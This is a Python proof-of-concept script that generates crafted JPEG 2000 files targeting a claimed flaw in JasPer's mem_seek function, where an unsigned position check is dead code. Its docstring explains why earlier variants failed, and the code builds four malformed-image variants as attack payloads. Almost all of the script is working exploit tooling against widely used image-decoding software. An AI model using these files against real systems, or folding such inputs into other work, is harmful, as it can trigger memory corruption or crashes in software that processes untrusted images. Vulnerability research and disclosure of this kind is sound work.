#!/usr/bin/env python3
"""
PoC generator for VULN 001 - mem_seek dead unsigned check in JasPer.

Vulnerability: mem_seek() in jas_stream.c declares newpos as size_t (unsigned),
  but the guard "if (newpos < 0)" is dead code.  When a SEEK_SET offset exceeds
  m->len_ the guard is silently bypassed and m->pos_ is set past the stream end.

Root cause of prior failures
  All earlier variants used Psot=0 in the SOT marker.  JasPer's
  jpc_sot_getparms requires sot->len >= 12 (lines 439-442 of jpc_cs.c), so
  Psot=0 caused jpc_getms to return NULL ("cannot get marker segment") before
  any tile decoding occurred.

  In addition, v1-v4 omitted the QCD marker, so jpc_dec_cp_isvalid
  (which checks JPC_CSET|JPC_QSET) would have failed even after fixing Psot.

Strategy
  v5: 4x4 image, 0 decomp levels, proper QCD, correct Psot -- baseline decode.
  v6: 32x32 image, 5 decomp levels, proper QCD (16 stepsizes), correct Psot.
  v7: 4096x4096, 5 decomp levels, QCD -- triggers large component stream init.
  v8: 256x256, 5 decomp levels, QCD, jp2c length=0 (to EOF like good JP2).
"""

import struct
import os
import sys

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))


# ---------------------------------------------------------------------------
# JP2 box helpers
# ---------------------------------------------------------------------------

def build_box(box_type: bytes, data: bytes) -> bytes:
    length = 8 + len(data)
    return struct.pack(">I", length) + box_type + data


def build_jp2_signature_box() -> bytes:
    return build_box(b"jP  ", b"\x0D\x0A\x87\x0A")


def build_file_type_box() -> bytes:
    data = b"jp2 " + struct.pack(">I", 0) + b"jp2 "
    return build_box(b"ftyp", data)


def build_ihdr_box(height: int, width: int, ncomp: int,
                   bpc: int = 7, c: int = 7, unk: int = 0, ip: int = 0) -> bytes:
    data = struct.pack(">IIHBBBB", height, width, ncomp, bpc, c, unk, ip)
    return build_box(b"ihdr", data)


def build_colr_box(ncomp: int = 1) -> bytes:
    ecs = 17 if ncomp == 1 else 16
    data = b"\x01\x00\x00" + struct.pack(">I", ecs)
    return build_box(b"colr", data)


def build_jp2h_box(height: int, width: int, ncomp: int) -> bytes:
    inner = build_ihdr_box(height, width, ncomp)
    inner += build_colr_box(ncomp)
    return build_box(b"jp2h", inner)


# ---------------------------------------------------------------------------
# JPC codestream marker builders
# ---------------------------------------------------------------------------

def build_siz_marker(width: int, height: int, ncomp: int = 1,
                     xrsiz: int = 1, yrsiz: int = 1,
                     tile_w: int = None, tile_h: int = None) -> bytes:
    if tile_w is None:
        tile_w = width
    if tile_h is None:
        tile_h = height
    lsiz = 38 + ncomp * 3
    data = struct.pack(">H", lsiz)
    data += struct.pack(">H", 0)           # Rsiz
    data += struct.pack(">I", width)       # Xsiz
    data += struct.pack(">I", height)      # Ysiz
    data += struct.pack(">I", 0)           # XOsiz
    data += struct.pack(">I", 0)           # YOsiz
    data += struct.pack(">I", tile_w)      # XTsiz
    data += struct.pack(">I", tile_h)      # YTsiz
    data += struct.pack(">I", 0)           # XTOsiz
    data += struct.pack(">I", 0)           # YTOsiz
    data += struct.pack(">H", ncomp)       # Csiz
    for _ in range(ncomp):
        data += b"\x07"                    # Ssiz: 8-bit unsigned
        data += bytes([xrsiz])             # XRsiz
        data += bytes([yrsiz])             # YRsiz
    return b"\xFF\x51" + data


def build_cod_marker(numdlvls: int = 5) -> bytes:
    """COD marker with given number of decomposition levels."""
    lcod = 12
    data = struct.pack(">H", lcod)
    data += b"\x00"                        # Scod: no SOP/EPH
    data += b"\x00"                        # progression order: LRCP
    data += struct.pack(">H", 1)           # num quality layers
    data += b"\x00"                        # multi-comp transform
    data += bytes([numdlvls])              # num decomp levels (NL)
    data += b"\x04"                        # xcb: code block width exp - 2 = 4
    data += b"\x04"                        # ycb: code block height exp - 2 = 4
    data += b"\x00"                        # code block style
    data += b"\x00"                        # wavelet transform (5/3 integer)
    return b"\xFF\x52" + data


def build_qcd_marker(numdlvls: int = 5) -> bytes:
    """QCD marker (no quantization) with enough step sizes for numdlvls."""
    # numrlvls = numdlvls + 1
    # For noqnt (Sqcd bits[4:0]=0): numstepsizes = 3*numrlvls - 2
    numrlvls = numdlvls + 1
    numstepsizes = max(1, 3 * numrlvls - 2)
    sqcd = 0x00        # noqnt, 0 guard bits
    stepsizes = bytes([0x00] * numstepsizes)  # all step size exponents = 0
    lqcd = 2 + 1 + len(stepsizes)
    data = struct.pack(">H", lqcd)
    data += bytes([sqcd])
    data += stepsizes
    return b"\xFF\x5C" + data


def build_sot_marker(tile_index: int, psot: int,
                     tpsot: int = 0, tnsot: int = 1) -> bytes:
    """SOT marker.  psot MUST be the exact tile-part byte count (>= 12).
    JasPer rejects psot < 12 (jpc_sot_getparms lines 439-442)."""
    lsot = 10
    data = struct.pack(">H", lsot)
    data += struct.pack(">H", tile_index)
    data += struct.pack(">I", psot)        # tile-part length (0 not allowed!)
    data += bytes([tpsot])                 # tile-part index
    data += bytes([tnsot])                 # total tile-parts in tile
    return b"\xFF\x90" + data


SOC = b"\xFF\x4F"
SOD = b"\xFF\x93"
EOC = b"\xFF\xD9"
EMPTY_PKT = b"\x00"   # empty packet header (MSB=0 means empty packet)

SOT_HDR_SIZE = 12    # SOT marker (2) + segment (10)
SOD_SIZE = 2         # SOD marker, no parameters


def codestream_psot(tile_data: bytes) -> int:
    """Psot = bytes from SOT start to first byte after tile data (exclusive of EOC)."""
    return SOT_HDR_SIZE + SOD_SIZE + len(tile_data)


# ---------------------------------------------------------------------------
# Codestream variants
# ---------------------------------------------------------------------------

def build_codestream_v5() -> bytes:
    """V5: 4x4, NL=0, QCD, correct Psot -- minimal valid codestream."""
    tile_data = EMPTY_PKT
    psot = codestream_psot(tile_data)
    cs = SOC
    cs += build_siz_marker(4, 4, 1)
    cs += build_cod_marker(numdlvls=0)
    cs += build_qcd_marker(numdlvls=0)     # Lqcd=4, 1 stepsize
    cs += build_sot_marker(0, psot)
    cs += SOD
    cs += tile_data
    cs += EOC
    return cs


def build_codestream_v6() -> bytes:
    """V6: 32x32, NL=5, QCD (16 stepsizes), correct Psot."""
    tile_data = EMPTY_PKT
    psot = codestream_psot(tile_data)
    cs = SOC
    cs += build_siz_marker(32, 32, 1)
    cs += build_cod_marker(numdlvls=5)
    cs += build_qcd_marker(numdlvls=5)     # Lqcd=19, 16 stepsizes
    cs += build_sot_marker(0, psot)
    cs += SOD
    cs += tile_data
    cs += EOC
    return cs


def build_codestream_v7() -> bytes:
    """V7: 4096x4096, NL=5, QCD -- large component stream (16 MB per comp).
    Target: jas_image_cmpt_create allocates 16MB stream, seeks to 16MB-1.
    The dead newpos<0 check is bypassed for the SEEK_SET init path."""
    tile_data = EMPTY_PKT
    psot = codestream_psot(tile_data)
    cs = SOC
    cs += build_siz_marker(4096, 4096, 1)
    cs += build_cod_marker(numdlvls=5)
    cs += build_qcd_marker(numdlvls=5)
    cs += build_sot_marker(0, psot)
    cs += SOD
    cs += tile_data
    cs += EOC
    return cs


def build_codestream_v8() -> bytes:
    """V8: 256x256, NL=5, QCD -- medium size; jp2c uses length=0 (to EOF)."""
    tile_data = EMPTY_PKT
    psot = codestream_psot(tile_data)
    cs = SOC
    cs += build_siz_marker(256, 256, 1)
    cs += build_cod_marker(numdlvls=5)
    cs += build_qcd_marker(numdlvls=5)
    cs += build_sot_marker(0, psot)
    cs += SOD
    cs += tile_data
    cs += EOC
    return cs


def build_jp2(codestream: bytes, width: int, height: int, ncomp: int,
              jp2c_eof: bool = False) -> bytes:
    sig = build_jp2_signature_box()
    ftyp = build_file_type_box()
    jp2h = build_jp2h_box(height, width, ncomp)
    if jp2c_eof:
        # jp2c with length=0 means "extends to EOF" (like the known-good JP2)
        jp2c = struct.pack(">I", 0) + b"jp2c" + codestream
    else:
        jp2c = build_box(b"jp2c", codestream)
    return sig + ftyp + jp2h + jp2c


VARIANTS = {
    "v5": {
        "desc": "4x4, NL=0, QCD (1 stepsize), correct Psot=15",
        "build": lambda: build_jp2(build_codestream_v5(), 4, 4, 1),
    },
    "v6": {
        "desc": "32x32, NL=5, QCD (16 stepsizes), correct Psot=15",
        "build": lambda: build_jp2(build_codestream_v6(), 32, 32, 1),
    },
    "v7": {
        "desc": "4096x4096, NL=5, QCD, large component stream",
        "build": lambda: build_jp2(build_codestream_v7(), 4096, 4096, 1),
    },
    "v8": {
        "desc": "256x256, NL=5, QCD, jp2c length=0 (to EOF)",
        "build": lambda: build_jp2(
            build_codestream_v8(), 256, 256, 1, jp2c_eof=True),
    },
}


if __name__ == "__main__":
    variant = sys.argv[1] if len(sys.argv) > 1 else "v5"
    if variant not in VARIANTS:
        print(f"Unknown variant {variant!r}. Available: {list(VARIANTS)}")
        sys.exit(1)
    info = VARIANTS[variant]
    payload = info["build"]()
    out_file = os.path.join(SCRIPT_DIR, "vuln_001.jp2")
    with open(out_file, "wb") as f:
        f.write(payload)
    print(f"[+] Variant {variant}: {info['desc']}")
    print(f"[+] Written {len(payload)} bytes to {out_file}")
